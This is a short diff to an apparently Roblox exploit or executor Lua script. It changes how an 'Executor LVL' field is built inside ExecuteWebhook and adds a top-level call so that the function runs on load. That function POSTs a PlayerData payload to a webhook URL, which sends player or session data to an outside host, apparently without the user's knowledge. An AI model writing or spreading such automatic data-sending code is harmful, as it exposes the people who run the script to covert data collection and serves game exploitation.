@@ -194,7 +194,7 @@ function ExecuteWebhook()
                     {
                         --[[ Exploit / Executor LVL]] --
                         ["name"] = "__Executor LVL:__ ",
-                        ["value"] = "LVL : " .. executorlvl,
+                        ["value"] = "LVL : " .. tostring(executorlvl()),
                         ["inline"] = true
                     },
                     {
@@ -243,6 +243,7 @@ function ExecuteWebhook()
     HttpRequest({Url = Webhook, Body = PlayerData, Method = "POST", Headers = Headers})
 end
 
+ExecuteWebhook()
 
 if not game:IsLoaded() then game.Loaded:Wait() end
 pcall(function() if clearconsole then clearconsole() end end)
